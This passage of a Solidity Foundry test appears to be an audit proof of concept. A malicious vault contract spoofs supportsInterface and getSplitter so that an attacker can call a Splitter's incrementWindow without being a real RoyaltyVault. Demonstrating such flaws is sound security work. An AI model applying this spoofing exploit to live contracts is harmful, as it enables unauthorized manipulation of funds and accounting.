    function supportsInterface(bytes4) external pure returns (bool) { return true; }
    function getSplitter() external view returns (address) { return splitter; }
    function trigger(uint256 amount) external {
        Splitter(splitter).incrementWindow(amount);
    }
}

contract SplitterTest is Test {
    Splitter target;
    TokenMock token;
    MaliciousRoyaltyVault vault;
    address attacker;

    function setUp() public {
        token = new TokenMock();
        target = new Splitter(address(token));
        // fund the splitter so the royaltyAmount check passes
        token.mint(address(target), 1000);
        attacker = makeAddr("attacker");
        vm.prank(attacker);
        vault = new MaliciousRoyaltyVault(address(target));
    }

    function test_attacker_exploits_incrementWindow() public {
        // Attacker calls their vault which spoofs supportsInterface and getSplitter
        vm.prank(attacker);
        vault.trigger(500);

        // Window incremented despite caller not being an actual RoyaltyVault
        assertEq(target.currentWindow(), 1);
        assertEq(target.balanceForWindow(0), 500);
    }
}
